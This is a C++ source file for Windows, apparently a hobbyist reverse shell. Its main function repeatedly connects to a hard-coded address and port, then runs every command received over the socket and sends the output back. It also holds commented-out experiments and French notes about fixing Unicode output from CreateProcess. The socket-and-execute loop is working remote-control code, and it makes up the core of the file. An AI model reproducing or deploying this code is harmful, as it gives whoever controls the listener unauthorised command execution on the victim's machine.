
using namespace std;

#include "../inc/master.h"
#include "../inc/common.h"
#include "../inc/Exec.h"

#define UNICODE
#define _UNICODE

wstring testlol()
{   
    WCHAR tazmail[21] =L"juan";
    return (wstring) tazmail;
}

int find_last_backslash(wstring &find_me)
{
    int index = 0;
    for(int i=0; i < find_me.length(); i++)
    {
        if(find_me.at(i) == L'\\')
        {
            wcout << "back slash find: "<< i << endl;
            index = i;
        }
    }
    return index + 1;
}

//https://stackoverflow.com/questions/6693010/how-do-i-use-multibytetowidechar

wstring ConvertUtf8ToWide(const string& str)
{
    int count = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), NULL, 0);
    wstring wstr(count, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), &wstr[0], count);
    return wstr;
}


int main()
{
    /*
    Found
    CHAR fuck[] = "Ελληνικά";
    cout << "sizeof fuck: " << strlen(fuck) << endl;
    
    _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
    
    wcout <<  ConvertUtf8ToWide((string) fuck) << endl;
    exit(0);
    */


   /*
    vector <string> tamer = Exec().executeCommand(L"dir");
    for(int i=0; i < tamer.size(); i++)
    {
        cout << tamer[i] << endl;
    }
    exit(0);
    Sleep(500);
    */

    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr("192.168.0.98");
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(12345);

   // cout << "1: " << test << endl;
    //int size_of_wchar = 

    while(connect(sock,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(2000);
        //Whait...;  
    } 

    CHAR buff_char[4096];

    string command;
    wstring w_cmd;
    vector<string> result;


    int stat,len_MultiByteToWideChar;

    
    //char test[] = "Ελληνικά";
    //cout << strlen(test) << endl;

    //send(sock, test, sizeof(test), 0);


    vector <string> utf8exec;
    //_setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
    while(true)
    {
        ZeroMemory(&buff_char, sizeof(buff_char));
        w_cmd.erase();
        recv(sock, buff_char, sizeof(buff_char), 0);
        cout << "Commande: " <<  buff_char << endl;

        w_cmd = ConvertUtf8ToWide((string) buff_char);

        utf8exec =  Exec().executeCommand(w_cmd);

        for(int i = 0;i < utf8exec.size(); i++)
        {
            send(sock, utf8exec[i].c_str(), utf8exec[i].length(), 0);
            wcout << "send : " << i << endl;
            Sleep(300);
        }
    }

    return 0;
}


/*
Remarque:

Ont pourraient stocker une chaine unicode dans un char, puis convertir la chaine en utf-16.
example:
char test[] = "Ελληνικά"
wcout << convert(test) << endl;
//La taille de test est de 16 octets. 

Probleme:
(1) Mon probleme est que je n'arrive pas à stocker un char unicode dans la fonction ReadFile.
Pour bypass se probleme,je doit executer une commande avec l'argument /U (pour unicode).
le probleme est que certaine commande ne sont a priori pas compatible avec l'argument /U, le resultat de la commande me renvoie du chinois ou du russe lol.


(2)Si je passe la fonction ReadFile avec un buffer de type char, alors tous les char(s) unicode apparaissent avec des points d'interrogation. 


Hypothese:


Je pense que pour remedier a se probleme, 1 -je vais devoir retirer l'argument /U
2- changer le buffer de ReadFile par un CHAR et non un WCHAR.
3- Je pense  que le probleme (2) viens du fait que lors de l'appel de CreatProcessW, le processus enfants ne prends pas en charge l'unicode.
Car lors de l'affichage du char unicode via cout, jobtient des carres et non des points d'interrogation.

Experience:

Pour resoudre le probleme 1, j'ai donc essayé de créer un processus avec une nouvelle fenetre, et les chars unicode se sont bien afficher.
Je pense donc que le probleme viens de ReadFile . 
Le probleme ne viens pas de ReadFile.

Il viens donc de soit CreatProcess, ou l'argument /C

Peut etre essayer d'ecrire directement dans la console plutot que passer par "/C" ? 

Resolution du probleme:

Mon probleme etait donc composé de deux erreurs.

CREATE NO WINDOWS : Le processus est une application console qui s'exécute sans fenêtre de console. Par conséquent, le handle de console de l'application n'est pas défini.

- ??? : https://stackoverflow.com/questions/43558888/readfile-in-windows
- https://stackoverflow.com/questions/39007332/c-getting-utf-8-output-from-createprocess
*/